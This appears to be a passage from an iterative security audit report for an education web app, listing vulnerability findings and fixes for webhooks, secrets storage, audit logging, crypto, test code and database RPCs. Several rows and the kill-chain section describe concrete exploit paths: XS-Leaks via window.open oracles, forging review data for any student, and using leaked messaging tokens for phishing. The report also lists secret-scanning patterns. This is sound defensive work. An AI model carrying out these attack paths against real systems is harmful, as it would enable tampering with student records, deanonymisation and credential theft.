| 2 | MEDIUM | Unbounded JSON recursion on attacker-reachable JSONB | `routes/ai/chat/retrieval.ts:173-194` (`extractTextFromBlockContent`) | Recursive walker over `summary_blocks.content` (JSONB, arbitrary depth). **No depth guard, no visited-set**. Called from RAG fallback cascade whenever vector search returns zero hits — student can trigger by chatting about un-ingested summary. Malicious/compromised professor (or any content_write_roles writer) publishes one `summary_blocks` row with ~10k-deep JSON array → blows V8 stack for every student querying. **Privilege-escalation DoS**. | Add `maxDepth` param (e.g. 32); return empty/flattened when exceeded. |

### Performance verified clean
- `WITH RECURSIVE`: **0 matches** across ~115 migrations.
- `get_content_tree`: fixed 4-level `jsonb_agg`, not recursive CTE.
- ReDoS: only linear regexes in prompt-sanitize + telegram command parser.
- `ORDER BY random()`, `md5(...)` on large cols, `LIMIT 9999/99999`: 0 matches.
- Trigram coverage matches ILIKE routes (summaries, keywords, videos).
- Hot-path indexes present: memberships by (user_id, institution_id), parent-key partials, fsrs/bkt by student_id, HNSW on chunks.embedding.
- `bulk_reorder` caps at 200; `subtopics-batch` caps keyword_ids at 50.
- Stripe webhook idempotent + bounded. Mux webhook single update.
- Batch embedding: `ingest.ts` caps batch_size=100; rag-chat caps message=2000 chars.

### Performance notes
- `generateEmbedding(text)` has no internal length cap but all callers cap upstream. Defense-in-depth gap only.
- ILIKE without trigram on `study_plan_tasks.title` + `topic_progress.course_name`: rows per-student, bounded scan cost.
- Only `summary_blocks.content` qualifies as deeply-nested user-writable JSONB beyond iter 7's `institutions.settings` (finding #2 above).

### Iter 24 totals
- **0 HIGH** (second 0-HIGH iter, confirming ROI exhaustion)
- **4 MEDIUM** (2 perf + 1 trigger search_path + 1 webhook slow processing)
- **1 LOW-batched** (6 updated_at triggers missing SET search_path)

**Acumulado tras iter 24: 6 CRITICAL + 65 HIGH + 96 MED + 18 LOW = 185 findings**

---

## Iteration 23 — 2026-04-17 — Kill-chain v3 + Webhook idempotency sweep

**Status:** ✓ complete (webhook + kill-chain v3)

### Webhook idempotency + replay protection (security-scanner)

**Scope**: 4 webhook endpoints (Stripe, WhatsApp, Telegram, Mux). Iter 6 HIGH-1 flagged Stripe SELECT-then-INSERT. This iter found **same race in WhatsApp + Telegram + Mux has ZERO idempotency**.

| # | Severity | Webhook | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **HIGH** | WhatsApp | `routes/whatsapp/webhook.ts:129-137, 147-154` | `isDuplicate()` SELECT-then-`insert()` race (same pattern as iter 6 HIGH-1). Migration `20260314000001:171-173` creates **non-unique** partial index on `wa_message_id` — no DB backstop. Meta retries on 5xx → concurrent deliveries both pass dedup → duplicate `handleMessage()` → duplicate AI calls, duplicate `sendText()`, duplicate OpenAI spend. | `CREATE UNIQUE INDEX idx_wa_log_msg_id ON whatsapp_message_log(wa_message_id) WHERE wa_message_id IS NOT NULL;` + switch to `.insert(...).select()` with `ON CONFLICT DO NOTHING`. |
| 2 | **HIGH** | Telegram | `routes/telegram/webhook.ts:66-75, 85-92` | Identical race on `(chat_id, tg_message_id)`. Migration `20260316000002:119-121` creates only non-unique partial index. | `CREATE UNIQUE INDEX ... ON telegram_message_log(chat_id, tg_message_id) WHERE tg_message_id IS NOT NULL;` + atomic INSERT-first pattern. |
| 3 | **HIGH** | Mux | `routes/mux/webhook.ts:15-75` | **ZERO idempotency.** No SELECT on `processed_webhook_events`, no INSERT of Mux event id. `20260227000006_webhook_events_table.sql` explicitly lists `'mux'` as source but handler never writes to it. Mux retries up to 24h; duplicate `video.asset.ready` re-runs `UPDATE videos` (idempotent on values) but side-effects via `fireFirstCompletionSignal` may be reached in future refactors. | Read `event.id` from envelope (currently discarded), check `processed_webhook_events` with `source='mux'`, INSERT after processing. Mirror Stripe pattern. |
| 4 | MEDIUM | Mux | `routes/mux/helpers.ts:56-66` | `verifyMuxWebhook` parses `t=` timestamp but **never validates freshness**. Unlike Stripe (5-min drift check), captured valid `mux-signature` can be replayed indefinitely. | `if (Math.abs(Date.now()/1000 - parseInt(timestamp)) > 300) return false;` |
| 5 | MEDIUM | Stripe | `routes/billing/webhook.ts:63-179` | Idempotency row written at line 171 **AFTER** all DB side effects (86-161). If crashed between subscription INSERT and `processed_webhook_events` INSERT, Stripe retry re-runs side effect. **Distinct from iter 6 HIGH-1 SELECT-INSERT race** — this is ordering. | Insert idempotency row atomically with side effect (same transaction via RPC) OR `INSERT ... ON CONFLICT` as gate BEFORE touching business tables. |
| 6 | MEDIUM | WhatsApp | `routes/whatsapp/webhook.ts:254, 363-409` | Handler calls outbound `sendText()` + `handleMessage()` (billable AI) **before** committing idempotency. Crash between outbound I/O and dedup INSERT → Meta 5xx-driven retry re-sends messages. | Move dedup INSERT to top of routing path (after HMAC + parse, before any outbound I/O). |
| 7 | MEDIUM | All | all 4 webhooks | **NO payload size cap.** `c.req.text()` reads whole body unconditionally. Memory DoS via huge payloads. | Read `Content-Length`, reject >1 MB (Stripe/Telegram/Mux), >5 MB (WhatsApp media) before buffering. |
| 8 | MEDIUM | Telegram | `routes/telegram/webhook.ts:205-220` | **NO timestamp / replay window.** Handler relies solely on dedup table. Combined with #2 (no UNIQUE) + 30-day log retention, captured request can be replayed from day 31+. | Short: atomic dedup per #2. Long: track per-chat `max(update_id)` + reject `update_id <= watermark`. |

### Webhook verified clean
- Signature verification order: Stripe + WhatsApp + Mux + Telegram all verify BEFORE parse / DB write.
- Cross-provider replay: `processed_webhook_events` UNIQUE on `(event_id, source)`. Stripe `evt_...` vs Telegram bigint cannot collide.
- Stripe 5-min replay tolerance enforced.
- Stripe 7-day retention documented + indexed.
- Unknown event types → 200 (prevents provider retry storms).
- WhatsApp dedup insert for rate-limited + unlinked paths present.

### Webhook notes
- **Secret rotation systemic**: all 4 webhooks read single env var, no dual-secret acceptance during rotation. Iter 21 flagged Stripe; same pattern across all 4.
- **No retention job for `processed_webhook_events`**: migration comment says "manual DELETE or scheduled job" but no `cron.schedule` found. Table grows unbounded. Low-sev future iter.

### Kill-chain v3 (security-scanner, post iter 14-22)

**What changed since v2**:
Iter 14-22 added **109 findings** (4 new CRITICAL + 33 new HIGH). Risk landscape shifted in four qualitative ways:
1. **UNAUTH attack paths appeared**: iter 15 `search_keywords_by_institution` granted to `anon` + iter 16 two CRITICAL public buckets collapse Chain 1 from 5 steps to 1 for partial content classes. Bypass `email_confirm` entirely.
2. **Atomic data-poisoning class**: `process_review_batch` (iter 20 CRITICAL) allows FSRS/BKT tampering of any student un-auditably.
3. **Defense-in-depth eroded silently**: `CREATE OR REPLACE` drops prior `ALTER FUNCTION` hardening. `resolve_parent_institution` runs without `pg_temp` + granted to authenticated+anon.
4. **Forensics dead**: zero audit log anywhere. Every chain becomes undetectable.

First-active-membership class grew 5→7+ sites. Trust-RLS-only added 3 HIGH endpoints. 13 Dashboard tables cannot be audited from migrations.

#### Chain updates

- **Chain 1** (UPDATED+SIMPLIFIED) **CRITICAL+** — Still valid via v2 5-step path. **New 1-step variants**: (A) hit public bucket URL with `institutionId/flashcardId` (iter 16), (B) anon POST `/rpc/search_keywords_by_institution` (iter 15).
- **Chain 3** (UPDATED) augmented with iter 12 sweep #3/#4 + no MFA.
- **Chain 6** (UPDATED — dual path). Path A = v2 SSRF. **Path B (iter 21 CRITICAL)** = DB dump → plaintext tokens of EVERY institution. Bypasses all SSRF fixes.
- **Chain 9** (UPDATED) adds iter 19 trust-RLS endpoints as siblings.

#### NEW chains

- **Chain 11 (NEW CRITICAL)** — UNAUTH storage + RPC enumeration: (11A) public-bucket URL guessing + (11B) anon RPC call. Zero signup.
- **Chain 12 (NEW CRITICAL)** — Atomic un-auditable FSRS/BKT poisoning: auth + `process_review_batch` → flip any student's stability/due_at/BKT un-auditably.
- **Chain 13 (NEW CRITICAL)** — DB dump → mass phishing: any DB read path → plaintext messaging tokens → send as legit institution brand.
- **Chain 14 (NEW HIGH)** — Silent CREATE OR REPLACE regression exploit: `resolve_parent_institution` temp-schema hijack window currently open.
- **Chain 15 (NEW MED multiplier)** — Student-ID enumeration via `resolve_student_summary_ids` → feeds chains 11A + 12.

### Updated Pareto fix order (v3)

| # | Finding | Chains broken | Effort |
|---|---|---|---|
| 1 | iter 16 #1+#2 flip buckets `public:false` + signed URLs | 11A + partial 1 | trivial |
| 2 | iter 15 #1 REVOKE `search_keywords_by_institution` from anon,authenticated | 11B | trivial (1 SQL) |
| 3 | iter 20 #1 `process_review_batch` add `auth.uid()` checks | 12 | small (3 lines) |
| 4 | iter 21 #1 encrypt messaging tokens (Vault/pgsodium) | 13 + Chain 6 Path B | medium |
| 5 | iter 11 #1 `email_confirm: false` | 1, 2, 3, 7, 8, 9 prereq | trivial |
| 6 | iter 3 auth HIGH-2 remove signup auto-join | same 6 chains | trivial |
| 7 | First-membership class (7+ sites) | 1, 3, 6A, 9 + silent-TG | medium |
| 8 | iter 18 #1 re-ALTER `resolve_parent_institution` search_path + REVOKE anon | 14 currently open | trivial |
| 9 | iter 3 AI HIGH-1 `.eq institution_id` on RAG fallback | 1, 9 | small |
| 10 | iter 12 Stripe refund/dispute/customer.deleted handlers | 8 | small |
| 11 | iter 1 RLS HIGH-1 drop member billing writes | 2 | small |
| 12 | iter 17 #2 `resolve_student_summary_ids` → `auth.uid()` | 15, reduces 11A/12 | trivial |
| 13 | iter 4 CI HIGH-1 fork PR gate | 4 | trivial |
| 14 | iter 19 #1+#2+#3 add `requireInstitutionRole` (3 sites) | 9 amplifier | small |
| 15 | iter 21 `audit_log` table + triggers | Forensic recovery for ALL chains | medium |

### Updated force multipliers (v3)

- **First-active-membership class** (7+ sites, dominant app-layer)
- **Public-bucket + deterministic path class** (NEW, iter 16) — enables UNAUTH that `email_confirm` cannot gate
- **Plaintext secrets at rest** (NEW, iter 21) — one compromise = every tenant's messaging channel
- **`email_confirm: true` + signup auto-join** (co-dominant prereq)
- **CREATE OR REPLACE silent regression** (NEW, iter 18) — compounds with every future SECURITY DEFINER migration until CI rule lands
- **No audit log** (META, iter 21) — not an attack enabler but makes every chain un-recoverable forensically
- **RAG fallback institution bypass** (iter 3 AI HIGH-1)
- **No MFA** (iter 11 #2)

### Iter 23 totals
- **3 HIGH** (webhook WA + TG + Mux idempotency)
- **5 MEDIUM** (webhook Mux replay + Stripe ordering + WA pre-dedup side effects + all-webhook size cap + TG replay)
- Kill-chain v3 synthesis (meta, no new findings — composes existing)

**Acumulado tras iter 23: 6 CRITICAL + 65 HIGH + 92 MED + 17 LOW = 180 findings**

---

## Iteration 22 — 2026-04-17 — Crypto primitives + Test code security

**Status:** ✓ complete (crypto + test code)

### Crypto primitives audit (security-scanner)

**Overall**: crypto posture is strong. No MD5/SHA-1, no eval, no `alg: none`, HMAC timing-safe, jose pinned. Minor hardening gaps only.

| # | Severity | Primitive | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | JWT alg confusion guard missing | `db.ts:123-125` | `jwtVerify(token, JWKS, { audience: "authenticated" })` does NOT pass `algorithms: ["ES256"]` allowlist. jose resolves key via `kid` from JWKS, but if Supabase adds RS256 JWK under same kid rotation, RFC 8725 §3.1 recommends pinning alg explicitly. Defense-in-depth, not active bypass. | Add `algorithms: ["ES256"]` to `jwtVerify` options. |
| 2 | MEDIUM | HMAC/encryption key reuse | `whatsapp/async-queue.ts:79-80,93-94` vs `whatsapp/webhook.ts:80-104` | Same env `WHATSAPP_APP_SECRET` used as (a) Meta HMAC-SHA256 webhook-verification key AND (b) key-material (SHA-256 of secret) for AES-GCM encrypting PII (phone). **NIST SP 800-133 key-separation violation** — compromise of either surface compromises both. | Derive two distinct keys via HKDF from `WHATSAPP_APP_SECRET` with labels ("wa-webhook-hmac" / "wa-phone-aead"), or separate `WHATSAPP_PII_ENC_KEY`. |
| 3 | LOW-MED | Weak PRNG for storage path entropy | `routes-storage.ts:153`, `routes-models.ts:322` | `Math.random().toString(36).substring(2, 8)` — ~30 bits non-cryptographic. Combined with `timestamp` practically not guessable; files served via signed URLs; impact LOW. Iter 16 flagged, still present. | `crypto.randomUUID().slice(0,8)` OR `crypto.getRandomValues(new Uint8Array(6))` → hex. |
| 4 | LOW | Modulo bias in 6-digit linking code | `whatsapp/link.ts:19-24`, `telegram/link.ts:23-28` | `100_000 + (array[0] % 900_000)` over `Uint32Array(1)`. 2^32 mod 900000 = 294967296 leaves residue — digits 0-294,967 slightly (0.0068%) more likely. Negligible given 5-min TTL + rate-limit, but avoidable. | Rejection sampling: redraw while `array[0] >= floor(2^32 / 900000) * 900000`. |

### Crypto verified strong
- `timing-safe.ts` — XOR-accumulated constant-time compare; consistent across Stripe, WhatsApp, Mux, Telegram, admin endpoints.
- HMAC verification: Stripe + 5-min timestamp tolerance, WhatsApp, Mux — all SHA-256, keys imported raw via `crypto.subtle.importKey`, compared with `timingSafeEqual`.
- Mux playback JWT: RS256 / RSASSA-PKCS1-v1_5 + SHA-256, key from env PKCS#8, `kid`/`aud`/`exp` set.
- AES-GCM phone encryption: random 12-byte IV, IV prepended, no IV reuse.
- Hashing: **only SHA-256** (phone hash, secret-to-key, chunk hash, WA media). **0 MD5 / 0 SHA-1 / 0 `createHash`** in backend or frontend.
- Salts: `generateSalt()` uses `crypto.getRandomValues(Uint8Array(32))` — 256 bits.
- Frontend: no password hashing, no JWT verification, no custom crypto. Only `crypto.randomUUID()` in MuxVideoPlayer.
- jose pinned at `v5.9.6` (modern, no known CVEs).
- **No embedded PEM private keys under source control** (only in planning doc as illustrative).

### Crypto notes
- `Math.random()` in `xp-engine.ts:132`, `quiz-session-helpers.ts:80` (Fisher-Yates), quiz ordering, AI chat UI, UI sidebar — all non-security (UI randomness). NOT flagged.
- Iter 11 timing-safe coverage remains intact; no regressions.
- No `dangerouslySetInnerHTML`, no `eval`, no `alg: 'none'` acceptance (only `alg: "HS256"` literals inside test fixtures forging JWTs to prove rejection).

### Test code security (security-scanner)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | MEDIUM | `backend/tests/e2e/08-security-rbac.test.ts:228-256` | RBAC-07 issues REAL `DELETE /institutions/:id` on configured institution when `TEST_ADMIN_EMAIL` is owner, then restores via `PUT {is_active:true}`. If PUT fails, process dies, or network drops between → institution stays soft-deleted. **Real mutation of potentially-prod state**. | Gate with `TEST_ALLOW_DESTRUCTIVE=1`, OR refactor to create-then-delete a throwaway institution. |
| 2 | MEDIUM | `backend/tests/e2e/08-security-rbac.test.ts:325-344` | RBAC-11 tests cross-institution denial with fake UUID (`…000099`); asserts 401/403/404. **Does not satisfy iter-18 recommendation** ("real non-member vs real other institution returns 0 rows"). 404 today passes even if endpoint returns someone else's data with 200 in the future. | Provision `TEST_SECOND_INSTITUTION_ID` (real, non-member for student) + assert `status===200 && items.length===0`. |
| 3 | MEDIUM | `backend/tests/helpers/test-client.ts:8` + all e2e | **NO runtime guard that `TEST_SUPABASE_URL` isn't prod**. Misconfigured CI matrix or dev `.env` swap → silently executes destructive e2e (RBAC-07, PUT /me, cleanup deletes) against prod. | Assert in `test-client.ts`: reject `SUPABASE_URL` if equals/matches prod ref (require `-test`/`-staging`, or allowlist). Fail-fast before any login. |

### Test code verified clean
- **No real secrets**: 0 matches for `sk_live_`, `whsec_`, `AIza…{35}`, `SG.`, `xoxb-`, `ghp_`, `AKIA…`, PEM blocks in any test.
- No `.env.test` / `.env.local` filesystem loads.
- Service-role placeholders (`fake-service-role-key-for-testing`, `test-service-role-key`) paired with unreachable `http://127.0.0.1:1`.
- No test-only routes mounted conditionally (no `NODE_ENV === 'test'` / `__TEST__` gated endpoints).
- No `test.only` / `describe.only` / `fit` / `fdescribe` leakage.
- All hardcoded dates inject via arg, never compare against `new Date()` — deterministic.
- Fetch mocks verify `calledUrl`/headers shape — not unconditional-success anti-pattern.
- Supabase hosts in frontend tests = unroutable TLDs (`mock.supabase.co` / `test.supabase.co`).
- `550e8400-e29b-41d4-a716-446655440000` = RFC 4122 example UUID.
- Test emails are fictional fixtures.

### Test code notes
- `TEST_USER_PASSWORD` / `TEST_ADMIN_PASSWORD` strength outside code scope — recommend test auth users in dedicated non-prod Supabase project.
- Cleanup is best-effort; failures only `console.warn`. Orphaned `__e2e_…__` rows accumulate in test DB.

### Iter 22 totals
- **0 HIGH** (first iter with 0 HIGH since iter 8)
- **4 MEDIUM** (2 crypto + 2 test code + RBAC-07 destructive + RBAC-11 weak)
- **2 LOW** (crypto PRNG + modulo bias)

**Acumulado tras iter 22: 6 CRITICAL + 62 HIGH + 87 MED + 17 LOW = 172 findings**

---

## Iteration 21 — 2026-04-17 — Secrets management + Audit trail completeness

**Status:** ✓ complete (audit trail + secrets)

### Audit trail completeness (security-scanner)

**Verdict**: NO `audit_log`/`security_log`/`admin_actions` table exists. Only audit-style line in code is `memberships.ts:123` (`console.warn`). **GDPR Art. 30 + SOC 2 CC7.2/7.3 FAIL.**

| # | Severity | Category | Where logged today | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | Role changes (membership PUT/DELETE) | `console.warn("[Axon Audit]")` **only on POST** in `memberships.ts:123`. PUT (role change) + DELETE (deactivate) silent. | **Privilege-escalation events have zero persistent trail**. `console.warn` lives in Edge Function logs (~1-day retention, not queryable). | `audit_log` row on every mutation: caller_role, target_role, action, diff. |
| 2 | HIGH | Billing state transitions | `webhook.ts:55-165` uses `console.error/warn`. `processed_webhook_events` stores event-id for idempotency only, not state changes. | No record of *what changed* (subscription → past_due, canceled, plan upgrade). Financial-dispute forensics impossible. | Append `billing_audit` row per webhook event (event_id, type, customer, old→new status). |
| 3 | HIGH | Institution admin actions | `institutions.ts` POST/PUT/DELETE — no log. Hard-delete rollback at line 75 silent. | Admin creates/updates/deactivates + transient hard-deletes leave no trace. | `admin_actions` table. |
| 4 | HIGH | Configuration changes | `algorithm-config.ts:182` sets `updated_by` + `updated_at` — **overwritten by next PUT**. `messaging-admin.ts` PUT (writes tokens) has **no log**. | No history, no diff; messaging-secret changes (access_token, webhook_secret) invisible. | `config_history` table; INSERT-only trigger capturing OLD/NEW row. |
| 5 | HIGH | Hard deletes | None. Found in `institutions.ts:75`, `admin-scopes.ts:102`, `calendar/exam-events.ts:202`, `prof-notes.ts:152`, `keyword-connections.ts:305`, `whatsapp/link.ts:154`, `telegram/link.ts:158`, `sticky-notes.ts:89`, `schedule-agent.ts:333` | Iter 17 confirmed: row vanishes, no forensic trail. Soft-deletes also no `deleted_by`. | `deletion_log` (table, row_id, actor, before-snapshot) via trigger. |
| 6 | MEDIUM | Sensitive data reads (admin reading others) | None. GET /memberships, admin report-dashboard — no access log. | **GDPR Art. 30 record-of-processing cannot demonstrate who read student data**. | Log admin GETs returning other users' rows. |
| 7 | MEDIUM | Security events (rate-limit, JWT fail, webhook sig reject) | `db.ts:137-147` returns `jwt_*_invalid` no log. `rate-limit.ts` in-memory Map. `webhook.ts` sig-fail returns 400 only. | Brute-force / replay / tampering **invisible**. No SIEM feed possible. | `security_events` table, 90-day retention. |
| 8 | MEDIUM | Mass/batch operations | `batch-review.ts`, `reorder.ts`, `subtopics-batch.ts`, `keyword-connections-batch.ts` — no audit. | 500-row reorder can't be reconstructed. | Log batch_id + item count + actor. |
| 9 | LOW | Signup success | `routes-auth.ts` no explicit log; relies on Supabase platform `auth.audit_log_entries`. | Platform-managed, retention unverified. | Mirror to app audit. |

### Existing logs table (none are append-only)
| Table | Scope | Retention | Append-only? |
|---|---|---|---|
| `ai_schedule_logs` | Claude schedule-agent calls | none | ❌ service_role FOR ALL |
| `rag_query_log` | RAG chat queries | none | ❌ |
| `retrieval_strategy_log` | RAG diagnostics | none | ❌ |
| `whatsapp_message_log` / `telegram_message_log` | Outbound delivery | 30 days | ❌ |
| `processed_webhook_events` | Idempotency only | 7 days (comment) | ❌ |
| `ai_content_reports` | User-flagged content | none | ❌ |
| `auth.audit_log_entries` (Supabase) | Login/signup/pwd-reset | Supabase default | Platform-managed |

### Compliance implications
- **GDPR Art. 30 (records of processing) + Art. 32 (integrity/confidentiality)**: cannot produce register of admin reads/writes on student PII.
- **SOC 2 CC7.2/7.3 (monitoring, incident detection)**: fails — no persistent, tamper-resistant event log for auth/role/config/deletion.
- **PCI DSS / HIPAA**: N/A (Stripe Checkout, no card data; no PHI).

### Audit trail recommendation
Consolidated `audit_log(id, actor_user_id, actor_role, institution_id, action, entity_table, entity_id, before_jsonb, after_jsonb, ip, user_agent, created_at)` + REVOKE UPDATE/DELETE FROM service_role; DB triggers on sensitive tables guarantee capture.

### Secrets management audit (security-scanner)

| # | Severity | Secret | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **CRITICAL** | WhatsApp `access_token`/`app_secret`/`verify_token`, Telegram `bot_token`/`webhook_secret` | `migrations/20260316000002:131-140` + `routes/settings/messaging-admin.ts:196-208` | `messaging_admin_settings.settings` is **plaintext jsonb** — NO pgsodium, NO Supabase Vault, NO `pgp_sym_encrypt`. Masking is applied only at API response time (`maskSettings`), not at storage. **Service role bypasses RLS → any DB dump / logical replica / PITR snapshot exposes every institution's raw tokens.** Combined with iter 1 HIGH-2 (SSRF via stored tokens): plaintext storage + SSRF = full cross-institution credential theft vector. | Wrap secret fields with `pgsodium.crypto_aead_det_encrypt` OR Supabase Vault (`vault.secrets`), reference by `secret_id` in JSONB. Encrypt at `upsert`, decrypt in `get*` endpoints. |
| 2 | HIGH | `.env` / `.env.local` not gitignored (backend) | `backend/.gitignore` (only has `supabase/.temp/`) | Frontend covers `.env` correctly; backend does not. A future `supabase secrets set --env-file .env` left in tree would be committed. No `.env` currently present (Glob → 0 matches), so latent risk. | Add `.env`, `.env.local`, `.env.*`, `!.env.example` to `backend/.gitignore`. Consider `git-secrets`/`trufflehog` pre-commit hook. |
| 3 | MEDIUM | `MUX_TOKEN_ID`, `MUX_TOKEN_SECRET`, `MUX_SIGNING_KEY_SECRET` | `routes/mux/helpers.ts:12-16` | Each uses `Deno.env.get("X") ?? ""`. Module-load constants → `muxAuth = "Basic " + btoa(":")` when missing; `buildPlaybackJwt` throws cryptic `atob("")` DOMException. `verifyMuxWebhook` is fail-closed (correct), but other paths produce confusing 500s that may leak stack traces. | `getMuxSecret(name)` helper throwing `"[Axon Fatal] <NAME> not configured"` on first use (lazy, matches `claude-ai.ts:38`/`gemini.ts:29` pattern). |

### Env var inventory
- **~25 distinct vars across Edge Functions**
  - **Secrets (14)**: `SUPABASE_SERVICE_ROLE_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`, `WHATSAPP_APP_SECRET`, `WHATSAPP_ACCESS_TOKEN`, `WHATSAPP_VERIFY_TOKEN`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_WEBHOOK_SECRET`, `MUX_TOKEN_SECRET`, `MUX_WEBHOOK_SECRET`, `MUX_SIGNING_KEY_SECRET`.
  - **Public/config (8)**: `SUPABASE_URL`, `SUPABASE_ANON_KEY`, `WHATSAPP_PHONE_NUMBER_ID`, feature flags, bot usernames.
  - **Test-only (6)**: scoped to `backend/tests/helpers/`.
- **Frontend**: single `import.meta.env.VITE_AXON_TODAY` (date override). `SUPABASE_ANON_KEY` hardcoded in config — public-by-design.

### Secrets verified clean
- **Frontend bundle**: no `SERVICE_ROLE_KEY` references anywhere (iter 9 holds).
- **Console logs**: no `console.log` prints raw token. HMAC error branches never emit expected-vs-received hex. Iter 6 regression-free.
- **AI provider keys** throw `[Axon Fatal] … not configured` on first use (`claude-ai.ts:39`, `gemini.ts:30`, `openai-embeddings.ts:32`) — fail-closed, no weak default.
- **No hardcoded `sk_live_`/`whsec_`/`AIza…`/`sk-…`** anywhere in source or tests (only mock literals).
- **No committed `.env` files** in any worktree.

### Secrets notes
- **Stripe webhook secret rotation**: single env var, no dual-secret overlap → brief rejection window during rotation. Acceptable given Stripe's automatic retry; document in runbook.
- **Scope minimization**: all Edge Functions share one env namespace. Mitigated because all handlers run under same service identity.

### Iter 21 totals
- **1 CRITICAL** (plaintext messaging tokens in DB)
- **6 HIGH** (5 audit trail + 1 backend .env gitignore gap)
- **4 MEDIUM** (3 audit trail + 1 Mux default config)
- **1 LOW** (signup platform-log mirror)

**Acumulado tras iter 21: 6 CRITICAL + 62 HIGH + 83 MED + 15 LOW = 166 findings actionable**

---

## Iteration 20 — 2026-04-17 — SQL body audit RPCs + XS-Leaks concrete

**Status:** ✓ complete (XS-Leaks + SQL body audit)

### XS-Leaks concrete exploitation (security-scanner)

**Context**: iter 5 found COOP/COEP missing. This iter operationalizes it.

| # | Severity | Vector | Exploit path | Fix |
|---|---|---|---|---|
| 1 | MEDIUM | `window.frames.length` oracle on popup | Attacker calls `window.open("https://axon.app/s/<summaryId>")`; without COOP retains window reference + reads `win.frames.length` cross-origin. `ViewerBlock.tsx:252` conditionally renders PDF `<iframe>` per block → **frame-count fingerprints "summary contains PDF / how many"**. Iterate known IDs to deanonymize content types of victim's library. | `COOP: same-origin` severs window ref; frame count unreadable. |
| 2 | MEDIUM | Navigation / `window.closed` timing oracle | Same `window.open(...)` to gated route. Without COOP, attacker polls `win.closed` + uses `win.location = <probe>` to force navigations while timing with `performance.now()`. Differential latency (redirect to `/login` vs. content render) **leaks auth state and existence of resources addressable by URL** (summary/course/exam IDs). | COOP blocks cross-origin window refs + nav side-channel. |
| 3 | LOW | Image-timing cache probe (residual) | `<img src="...">` + `onload`/`onerror` handlers time cache-warm vs cold to infer whether victim viewed specific resource. Mitigated by timestamp-prefixed paths (`ImageUploadDialog.tsx:98`, `TipTapEditor.tsx:461`). **Becomes HIGH if any deterministic avatar/asset path introduced** (cf. iter 16 flashcard-images/infographic-images CRITICAL findings). | Maintain UUID/timestamp paths; COEP `require-corp` + CORP `same-origin` eliminates probe. |
| 4 | LOW | Third-party font connection timing | `typography.ts:29-30` loads Google Fonts. `strict-origin-when-cross-origin` strips query leak. Residual: connection timing observable but no user-specific data. | No fix needed beyond current referrer policy. |

### XS-Leaks mitigated by current design
- Vector 1 embed direction (iframe Axon): `X-Frame-Options: DENY` + CSP `frame-src 'none'` MITIGATED.
- `postMessage` eavesdrop: no `addEventListener('message')` in frontend.
- `/api/me` cache probe: requires `X-Access-Token`; cross-origin fetch 401 → not differentially cacheable.
- `:visited` history sniff: no styling of dynamic links.
- Search `Referer` leak: referrer-policy strips query.
- OAuth leaks: no `window.open`, no `signInWithOAuth`.
- Quota-eviction: localStorage origin-scoped; attacker cannot evict.
- Service worker: none registered.

### XS-Leaks notes
- Net new HIGH: 0. Two MEDIUMs genuinely exploitable given missing COOP.
- **COOP alone is safe to ship immediately and closes #1 + #2.** COEP may break Unsplash/Mux/Google-Fonts subresources unless those set CORP — verify first.
- `window.open` audit: zero call sites in frontend — no Axon-initiated popups needing COOP for reverse protection.

### SQL body audit of SECURITY DEFINER RPCs (security-scanner)

**Severity escalations** (body-reading adds exploit detail iter 15 missed):

| # | Severity | RPC | Migration:line | Issue (expanded) | Fix |
|---|---|---|---|---|---|
| 1 | **CRITICAL** ↑ (iter 15 was MED) | `process_review_batch(uuid, jsonb, jsonb, jsonb)` | `20260414000001:57-170` (grant:180) | SECURITY DEFINER + `authenticated` grant + zero `auth.uid()` check. **3 exploit vectors**: (a) `p_session_id` trusted → review forgery into any session; inserted rows fire `on_review_inserted` trigger polluting `daily_activities`/`student_stats` of victim student. (b) FSRS block lets any caller overwrite ANY student's `stability`, `due_at`, `is_leech` via `ON CONFLICT DO UPDATE`. (c) BKT block lets attacker control `student_id` + inline counter arithmetic (`total_delta`/`correct_delta`) — atomically poisoning counters on ANY student/subtopic pair **un-auditably (no xp_transactions-style log)**. | Derive `student_id` from `auth.uid()`; verify every `elem->>'student_id' = auth.uid()`; verify `p_session_id`'s `study_sessions.student_id = auth.uid()` before any write. Or revoke to `service_role`. |
| 2 | **HIGH** ↑ (iter 15 was MED) | `increment_block_mastery_attempts(UUID, UUID, INT, INT)` | `20260406000001:49-74` | Created 2026-04-06 AFTER the 20260403 revoke sweep — fell through cracks. SECURITY DEFINER + `authenticated` grant + no auth check. `p_student_id` caller-supplied → any auth user increments another student's mastery counters. | `REVOKE EXECUTE FROM authenticated; GRANT TO service_role` (mirror `20260403000001`). Or add `IF p_student_id != auth.uid() THEN RAISE EXCEPTION`. |

**New findings** (not seen in prior iters):

| # | Severity | RPC | Migration:line | Issue | Fix |
|---|---|---|---|---|---|
| 3 | MEDIUM | `bulk_reorder(text, jsonb)` | `20260319000001:76` | **First-id-only authorization**: `v_first_id := (p_items->0->>'id')::uuid;` — only element [0] resolved to institution + role-checked. Subsequent `EXECUTE format('UPDATE %I ... WHERE t.id = (i->>''id'')::uuid', ...)` updates EVERY row in array (up to 200). Professor in inst A submits `[{id:A-row,order:0},{id:B-row,order:0},...]` → silently reorder inst B rows. Grant `service_role` only (mitigates via PostgREST) but any Edge Function forwarding user array trips it. | Iterate + verify EVERY `p_items[i]->>'id'` resolves to same authorized institution. Or `WHERE t.id = ANY(allowed_ids)` subquery. |
| 4 | MEDIUM | `trash_scoped(text, int)` | `20260319000015:42-160` | Any auth member (incl. students) can list trashed `flashcards`, `quiz_questions`, `summaries`, `keywords`, `videos`, hierarchy in their institution. Title columns (`f.front`, `q.question_text`) **leak deleted content bodies**, not just IDs. Over-returning to unprivileged roles. | Add `EXISTS memberships WHERE role IN ('owner','admin','professor')` gate; else 0 rows. Or strip titles when caller lacks CONTENT_WRITE. |
